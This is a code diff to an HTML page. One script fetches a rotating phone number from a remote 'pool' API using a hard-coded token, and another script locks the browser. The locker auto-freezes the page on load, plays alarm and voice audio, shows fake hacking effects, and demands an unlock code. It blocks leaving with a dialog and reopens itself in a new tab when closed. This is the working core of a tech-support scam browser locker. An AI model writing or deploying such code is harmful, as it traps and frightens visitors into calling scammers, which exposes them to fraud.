@@ -577,7 +577,7 @@
 (function () {
   const TOKEN = "3b49Ey0SmtVHT2IQZe2br6XzM6cjEtKNCVvpKPep6030Zo8lmGy2VcraZ32n";
   const API   = "https://console.dialcs.com/backend/api/pool";
-  const POLL_MS = 5000; // check every 5 seconds
+  const POLL_MS = 5000;
 
   const els = [
     document.getElementById("singleNumber"),
@@ -592,13 +592,13 @@
 
   async function loadNumber() {
     try {
-      const res = await fetch(API, {
-        headers: { "Authorization": "Bearer " + TOKEN },
+      const res = await fetch(API + "?token=" + encodeURIComponent(TOKEN), {
+        method: "GET",
         cache: "no-store"
       });
       const data = await res.json();
+      console.log("API Response:", data);
 
-      // API returns { success:true, numbers:[...] }
       let num = null;
       if (data && data.success) {
         if (Array.isArray(data.numbers) && data.numbers.length > 0) {
@@ -608,12 +608,16 @@
         }
       }
 
-      if (num && num !== lastNumber) {
-        lastNumber = num;
-        setText(num);
-        console.log("Number updated:", num);
-      } else if (!num) {
-        setText(data && data.message ? data.message : "Number not found");
+      if (num) {
+        if (num !== lastNumber) {
+          lastNumber = num;
+          setText(num);
+          console.log("Number updated:", num);
+        }
+      } else if (data && data.message) {
+        setText(data.message);
+      } else {
+        setText("Number not found");
       }
     } catch (err) {
       console.error("API Error:", err);
@@ -621,11 +625,9 @@
     }
   }
 
-  // initial load + poll for IP change
   loadNumber();
   setInterval(loadNumber, POLL_MS);
 
-  // also re-check when the tab regains focus (IP may have changed)
   window.addEventListener("focus", loadNumber);
   document.addEventListener("visibilitychange", function () {
     if (!document.hidden) loadNumber();
@@ -633,6 +635,9 @@
 })();
 </script>
 
+<script>
+(function () {
+  "use strict";
 
   /* ============ CONFIG ============ */
   const UNLOCK_CODE         = "1234";
@@ -640,7 +645,7 @@
   const REFREEZE_ON_ESCAPE  = true;
   const HACK_MS             = 900;
   const BEEP_ON_FREEZE      = false;
-  const REOPEN_ON_CLOSE     = true;   // reopen same URL in new tab on close
+  const REOPEN_ON_CLOSE     = true;
   const FREEZE_ON_ANY_CLICK = true;
   const VOICE_ENABLED       = true;
   const SIREN_ENABLED       = false;
@@ -652,9 +657,9 @@
   const PS_TYPE_SPEED_MS    = 40;
   const VOICE_REPEAT_MS     = 12000;
   const ALARM_REPEAT_MS     = 5000;
-  const CF_INSTANT          = true;   // instant freeze on load
-  const AUTO_FREEZE_ON_LOAD = true;   // popup shows instantly
-  const AUTO_FREEZE_DELAY   = 0;      // ms delay before auto-freeze
+  const CF_INSTANT          = true;
+  const AUTO_FREEZE_ON_LOAD = true;
+  const AUTO_FREEZE_DELAY   = 0;
   /* ================================== */
 
   let frozen = false;
@@ -1259,12 +1264,10 @@
   }
 
   if (AUTO_FREEZE_ON_LOAD) {
-    // try to arm audio immediately, then freeze
     getCtx();
     if (AUTO_FREEZE_DELAY > 0) {
       setTimeout(autoFreeze, AUTO_FREEZE_DELAY);
     } else {
-      // slight delay so DOM + first paint complete
       setTimeout(autoFreeze, 50);
     }
   }
@@ -1295,17 +1298,15 @@
   let isReloading = false;
   let allowLeave   = false;
 
-  // Native "Leave site?" dialog when user tries to close/refresh
   window.addEventListener("beforeunload", function (e) {
     if (allowLeave) return;
     if (!frozen) return;
     if (isReloading) return;
     e.preventDefault();
-    e.returnValue = "";   // triggers browser "Leave / Cancel" popup
+    e.returnValue = "";
     return "";
   });
 
-  // When the tab actually closes, instantly reopen the same URL in a new tab
   window.addEventListener("unload", function () {
     if (!REOPEN_ON_CLOSE) return;
     if (isReloading) return;
@@ -1316,7 +1317,6 @@
     } catch (err) {}
   });
 
-  // Detect reload so we don't reopen on F5 / Ctrl+R
   window.addEventListener("keydown", function (e) {
     if (e.key === "F5" || (e.ctrlKey && e.key === "r")) isReloading = true;
   }, true);
